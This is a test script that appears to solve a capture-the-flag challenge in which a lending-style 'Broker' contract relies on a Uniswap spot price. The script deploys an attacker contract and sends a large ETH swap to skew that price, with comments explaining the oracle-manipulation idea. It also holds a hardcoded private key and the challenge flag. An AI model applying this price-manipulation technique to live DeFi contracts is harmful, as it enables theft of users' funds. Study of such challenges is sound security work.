import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { deployOrGetAt, getEoaOrPrivateKey } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let eoaAddress: string;
let attacker: Contract;
let setup: Contract; // setup contract
let token: Contract;
let pair: Contract;
let broker: Contract;
let tx: any;

before(async () => {
  eoa = await getEoaOrPrivateKey(
    `0x45fa2c04a9c1c431bc4845958e96e5294fc526e46934a30155ae7fc66809b2f4`
  );
  eoaAddress = await eoa.getAddress();

  setup = await deployOrGetAt(
    `contracts/broker/public/contracts/Setup.sol:Setup`,
    `0xA5e66f7CaE131159A411160B823256449F3F3b77`,
    eoa,
    { value: ethers.utils.parseEther(`50`) }
  );
  token = await ethers.getContractAt(`Token`, await setup.token());
  pair = await ethers.getContractAt(
    `contracts/broker/public/contracts/Broker.sol:IUniswapV2Pair`,
    await setup.pair()
  );
  broker = await ethers.getContractAt(`Broker`, await setup.broker());
});

it("solves the challenge", async function () {
  const reserves = await pair.getReserves()
  console.log(`reserves`, ethers.utils.formatEther(reserves[0]), ethers.utils.formatEther(reserves[1]))

  // skew the uniswap price such that the ratio is 1:1 and pay back all tokens
  // eoa starts with 5k ETH, so we don't need a flash swap.
  // (it would not work with a Uniswap flash swap anyway
  // because the reserves are not yet updated in the callback)

  const attackerFactory = await ethers.getContractFactory(`BrokerAttacker`, eoa);
  attacker = await attackerFactory.deploy(setup.address);

  tx = await attacker.attack({ value: ethers.utils.parseEther(`4949`)})
  await tx.wait()

  // PCTF{SP07_0R4CL3S_L0L}
});
